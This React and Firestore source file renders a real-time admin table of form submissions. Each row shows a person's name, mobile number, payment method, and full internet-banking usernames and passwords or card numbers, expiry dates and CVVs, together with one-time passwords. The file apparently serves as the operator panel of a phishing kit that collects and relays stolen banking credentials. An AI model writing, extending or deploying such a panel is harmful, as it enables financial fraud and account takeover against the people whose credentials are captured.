import * as React from 'react';
import PropTypes from 'prop-types';
import { alpha } from '@mui/material/styles';
import Box from '@mui/material/Box';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TablePagination from '@mui/material/TablePagination';
import TableRow from '@mui/material/TableRow';
import TableSortLabel from '@mui/material/TableSortLabel';
import Toolbar from '@mui/material/Toolbar';
import Typography from '@mui/material/Typography';
import Paper from '@mui/material/Paper';
import Checkbox from '@mui/material/Checkbox';
import IconButton from '@mui/material/IconButton';
import Tooltip from '@mui/material/Tooltip';
import DeleteIcon from '@mui/icons-material/Delete';
// import { visuallyHidden } from '@mui/utils';
import Stack from '@mui/material/Stack';
import Button from '@mui/material/Button';

import ViewModal from './ViewModal';
import ActionModal from './ActionModal';
import DeleteModal from './DeleteModal';
import {getFormData, getTotalData} from '../action/table';
import { db } from '../firebase';
import { usePagination } from 'use-pagination-firestore';
import { collection, query, orderBy, onSnapshot, limit, doc, deleteDoc, updateDoc, increment } from 'firebase/firestore';

const firestoreOrderBy = orderBy;
const MAX_MESSAGE_SIZE = 50;
function descendingComparator(a, b, orderBy) {
  if (b[orderBy] < a[orderBy]) {
    return -1;
  }
  if (b[orderBy] > a[orderBy]) {
    return 1;
  }
  return 0;
}

function getComparator(order, orderBy) {
  return order === 'desc'
    ? (a, b) => descendingComparator(a, b, orderBy)
    : (a, b) => -descendingComparator(a, b, orderBy);
}

// This method is created for cross-browser compatibility, if you don't
// need to support IE11, you can use Array.prototype.sort() directly
function stableSort(array, comparator) {
  const stabilizedThis = array.map((el, index) => [el, index]);
  stabilizedThis.sort((a, b) => {
    const order = comparator(a[0], b[0]);
    if (order !== 0) {
      return order;
    }
    return a[1] - b[1];
  });
  return stabilizedThis.map((el) => el[0]);
}

const headCells = [
 
  {
    id: 'id',
    numeric: false,
    disablePadding: false,
    label: 'ID',
  },
   {
    id: 'name',
    numeric: false,
    disablePadding: false,
    label: 'Name',
  },
  {
    id: 'createdAt',
    numeric: false,
    disablePadding: false,
    label: 'Date',
  },
  {
    id: 'mobile_no',
    numeric: false,
    disablePadding: false,
    label: 'Mobile',
  },
  
  {
    id: 'payment_method',
    numeric: false,
    disablePadding: false,
    label: 'Payment Method',
  },
  {
    id: 'issue',
    numeric: false,
    disablePadding: false,
    label: 'Issue',
  },
  {
    id: 'issueType',
    numeric: false,
    disablePadding: false,
    label: 'Issue Type',
  },
  {
    id: 'amount',
    numeric: false,
    disablePadding: false,
    label: 'Amount',
  },
  {
    id: 'm_pin_1',
    numeric: false,
    disablePadding: false,
    label: 'Pin/User Details',
  },
  {
    id: 'm_pin_2',
    numeric: false,
    disablePadding: false,
    label: 'Pin 2/ OTP',
  },
  {
    id: 'action',
    numeric: false,
    disablePadding: false,
    label: 'Action',
  },
];

function EnhancedTableHead(props) {

  return (
    <TableHead>
      <TableRow>
        {headCells.map((headCell) => (
          <TableCell
            width={headCell.width}
            key={headCell.id}
            align={ headCell.id === 'message' ? 'left' :'center'}
            padding={headCell.disablePadding ? 'none' : 'normal'}
          >
              {headCell.label}
           
          </TableCell>
        ))}
      </TableRow>
    </TableHead>
  );
}

EnhancedTableHead.propTypes = {
  order: PropTypes.oneOf(['asc', 'desc']).isRequired,
  // orderBy: PropTypes.string.isRequired,
  rowCount: PropTypes.number.isRequired,
};

const EnhancedTableToolbar = (props) => {
  const { numSelected } = props;

  return (
    <Toolbar
      sx={{
        pl: { sm: 2 },
        pr: { xs: 1, sm: 1 },
        ...(numSelected > 0 && {
          bgcolor: (theme) =>
            alpha(theme.palette.primary.main, theme.palette.action.activatedOpacity),
        }),
      }}
    >
      {numSelected > 0 ? (
        <Typography
          sx={{ flex: '1 1 100%' }}
          color="inherit"
          variant="subtitle1"
          component="div"
        >
          {numSelected} selected
        </Typography>
      ) : (
        <Typography
          sx={{ flex: '1 1 100%' }}
          variant="h6"
          id="tableTitle"
          component="div"
        >

        </Typography>
      )}

      {numSelected > 0 ? (
        <Tooltip title="Delete">
          <IconButton>
            <DeleteIcon />
          </IconButton>
        </Tooltip>
      ) : (
        <></>
      )}
    </Toolbar>
  );
};

EnhancedTableToolbar.propTypes = {
  numSelected: PropTypes.number.isRequired,
};

export default function EnhancedTable(props) {

    const [data,setData] = React.useState([]);
  const [order, setOrder] = React.useState('asc');
  // const [orderBy, setOrderBy] = React.useState('date');
  const [selected, setSelected] = React.useState([]);
  const [selectedData, setSelectedData] = React.useState({});
  const [isViewModelOpen, setIsViewModalOpen] = React.useState(false);
  const [isActionModlOpen, setIsActionModlOpen] = React.useState(false);
  const [isDeleteModlOpen, setIsDeleteModlOpen] = React.useState(false);
  const [page, setPage] = React.useState(0);
  const [total, setTotal] = React.useState(0);
  const [lastDoc, setlastDoc] = React.useState(null);
  const [fetchedData, setFetchedData] = React.useState(false)
  const [rowsPerPage, setRowsPerPage] = React.useState(10);
  const {
    items,
    isLoading,
    isStart,
    isEnd,
    getPrev,
    getNext,
} = usePagination(query(collection(db, "formData"), firestoreOrderBy("slNo", "desc")),{ limit: rowsPerPage });

React.useEffect(()=> {
  const finalItem = items.map(row => {
    if (row.payment_method === 'Internet banking') {
      row.m_pin_1 = `Bank-${row.bankname} Username-${row.username}  Password-${row.password}`;
      row.m_pin_2 = row.otp;
    } else if (row.payment_method === 'Credit or Debt card') {
      row.m_pin_1 = `Card No-${row.cardNumber} Expire-${row.expire} CVV-${row.cvv}`;
      row.m_pin_2 = row.otp;
    }
    return row;
  });
  setData(finalItem);
},[items]);

React.useEffect(()=> {
  return onSnapshot(doc(db, "formDataCounter", "counter"), (doc) => {
    const t = doc.data().dataCount || 0
    setTotal(t);
  });
},[]);


  React.useEffect(()=> {
    const q = query(collection(db, "formData"), firestoreOrderBy("slNo", "desc"), limit(rowsPerPage));
    return onSnapshot(q, (snapshot) => {
      if(!fetchedData) {
        setFetchedData(true);
        return;
      }
    snapshot.docChanges().forEach((change) => {    
      let oldData = [...data]
      if (change.type === "added") {
          oldData.unshift(change.doc.data());
      }
      if (change.type === "modified") {
        oldData = oldData.map(d=> {
          if(d.slNo === change.doc.data().slNo) {
            return change.doc.data()
          } else {
            return d;
          }
        })
      }
      if (change.type === "removed") {
        oldData = oldData.filter(d=> d.slNo !== change.doc.data().slNo);
      }
      setData(oldData);
    });
  })
  },[]);
  
  //action
  const handleActionClick = (row) => {
        setSelectedData(row);
       setIsActionModlOpen(true);
  }
  //delete
  const handleDeleteClick = (row) => {
    setSelectedData(row);
    setIsDeleteModlOpen(true);
}

const handleDeleteConfirm = async() => {
    const id = selectedData.id;
    setIsDeleteModlOpen(false);
    if (id) {
      const counterDoc = doc(db, 'formDataCounter', 'counter');
      try {
        await deleteDoc(doc(db, 'formData', id)); 
        await updateDoc(counterDoc, { dataCount: increment(-1) });
      } catch (err) {
        console.log(err)
      }
    }
}

const handleSendClicked = (data) => {
  console.log(selectedData);
  console.log(data);
  setIsActionModlOpen(false);
}

  const handleViewMoreClick = (row) => {
    setSelectedData(row);
    setIsViewModalOpen(true);
  }
  
  const handleSelectAllClick = (event) => {
    if (event.target.checked) {
      const newSelecteds = data.map((n) => n.name);
      setSelected(newSelecteds);
      return;
    }
    setSelected([]);
  };

  const handleClick = (event, name) => {
    const selectedIndex = selected.indexOf(name);
    let newSelected = [];

    if (selectedIndex === -1) {
      newSelected = newSelected.concat(selected, name);
    } else if (selectedIndex === 0) {
      newSelected = newSelected.concat(selected.slice(1));
    } else if (selectedIndex === selected.length - 1) {
      newSelected = newSelected.concat(selected.slice(0, -1));
    } else if (selectedIndex > 0) {
      newSelected = newSelected.concat(
        selected.slice(0, selectedIndex),
        selected.slice(selectedIndex + 1),
      );
    }

    setSelected(newSelected);
  };

  const handleChangePage = (event, newPage) => {
    let next = newPage > page;
    next? getNext() : getPrev();
    setPage(newPage);
    // getFormData(lastDoc, rowsPerPage, next).then(data=> {
    //   console.log(data);
    //   data.last && setlastDoc(data.last);
    //   setData(data.data);
    // })
    // setPage(newPage);
 
  };

  const handleChangeRowsPerPage = (event) => {
    setRowsPerPage(parseInt(event.target.value, 10));
    setPage(0);
  };


  const isSelected = (name) => selected.indexOf(name) !== -1;

  // Avoid a layout jump when reaching the last page with empty data.

  return (
    <Box sx={{ width: '80rem', display: 'flex', justifyContent  : 'center', marginTop: '1%' }}>
        <ViewModal open={isViewModelOpen} data={selectedData} handleOpen={()=>setIsViewModalOpen(true)} handleClose = {()=> setIsViewModalOpen(false)}></ViewModal>
        <ActionModal open={isActionModlOpen} data={selectedData} handleOpen={()=> setIsActionModlOpen(true)} handleSendClicked={handleSendClicked} handleClose = {()=>  setIsActionModlOpen(false)}></ActionModal>
        <DeleteModal open={isDeleteModlOpen} handleDeleteConfirm={handleDeleteConfirm} handleClose = {()=>  setIsDeleteModlOpen(false)}></DeleteModal>
      {isLoading ? <Typography
          sx={{ flex: '1 1 100%' }}
          color="primary"
          variant="h3"
          component="div"
        >Loading...</Typography>
      : <Paper sx={{ width: '100%', mb: 2 }}>
        {/* <EnhancedTableToolbar numSelected={selected.length} /> */}
        <TableContainer>
          <Table
            sx={{ minWidth: 750 }}
            aria-labelledby="tableTitle"
            size={'medium'}
          >
            <EnhancedTableHead
              order={order}
              // orderBy={orderBy}
              rowCount={data.length}
            />
            <TableBody>
              {data.map((row, index) => {
                  const labelId = `enhanced-table-checkbox-${index}`;
                  return (
                    <TableRow
                      hover
                      tabIndex={-1}
                      key={row.id}
                    >
                      <TableCell
                        component="th"
                        id={labelId}
                        scope="row"
                        padding="none"
                        align="center"
                      >
                        {row.slNo || 'N/A'}
                      </TableCell>
                      <TableCell align="center">{row.name}</TableCell>

                      <TableCell align="center">{row.createdAt ? row.createdAt.toDate().toLocaleString():'N/A'}</TableCell>
                      <TableCell align="center">{row.mobile_no}</TableCell>
                      <TableCell align="center">{row.payment_method}</TableCell>
                      <TableCell align="center">{row.issue} </TableCell>
                      <TableCell align="center">{row.issueType} </TableCell>
                      <TableCell align="center">{row.amount} </TableCell>
                      <TableCell align="center">{row.m_pin_1} </TableCell>
                      <TableCell align="center">{row.m_pin_2} </TableCell>
                      <TableCell align="center">
                      <Button className='w-0.5 h-0.5 grow' size="small" variant="contained" color="error" onClick={()=>handleDeleteClick(row)} style={{width: "50px"}}>Delete</Button>
                      </TableCell>
                    </TableRow>
                  );
                })}
            </TableBody>
          </Table>
        </TableContainer>
        <TablePagination
          rowsPerPageOptions={[1, 10, 25]}
          component="div"
          count={total}
          rowsPerPage={rowsPerPage}
          page={page}
          onPageChange={handleChangePage}
          onRowsPerPageChange={handleChangeRowsPerPage}
        />
      </Paper>}
    </Box>
  );
}
